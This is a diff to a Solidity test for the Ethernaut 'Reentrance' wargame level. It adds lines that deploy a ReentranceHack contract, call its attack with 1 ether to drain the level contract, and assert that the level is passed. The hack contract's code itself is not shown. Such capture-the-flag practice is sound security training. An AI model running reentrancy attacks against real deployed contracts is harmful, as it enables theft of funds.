@@ -30,14 +30,18 @@ contract ReentranceTest is DSTest {
         ethernaut.registerLevel(reentranceFactory);
         // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
         vm.startPrank(attacker);
-        address levelAddress = ethernaut.createLevelInstance(reentranceFactory);
+        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(reentranceFactory);
         Reentrance ethernautReentrance = Reentrance(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
- 
 
+        ReentranceHack reentranceHack = new ReentranceHack(payable(levelAddress));
+        reentranceHack.attack{value: 1 ether}();
+
+        console.log(address(ethernautReentrance).balance);
+        console.log(ethernautReentrance.balances(address(reentranceHack)));
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -45,6 +49,6 @@ contract ReentranceTest is DSTest {
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
